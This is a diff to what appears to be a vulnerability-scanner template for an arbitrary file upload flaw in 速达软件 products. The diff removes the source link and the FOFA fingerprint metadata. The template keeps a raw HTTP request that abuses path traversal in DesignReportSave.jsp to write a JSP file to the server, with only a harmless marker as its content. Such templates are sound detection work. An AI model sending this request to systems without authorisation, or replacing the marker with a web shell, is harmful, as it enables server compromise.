@@ -3,12 +3,8 @@ info:
   name: 速达软件全系产品任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wcikrp79p24u4916'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wcikrp79p24u4916
-    fofa: app="速达软件-公司产品"
 http:
 - raw:
   - 'POST /report/DesignReportSave.jsp?report=../dudesuite.jsp HTTP/1.1
@@ -30,8 +26,6 @@ http:
 
 
     Content-Type: application/octet-stream
-
-
 
 
     <% out.print("dudesuite");%>
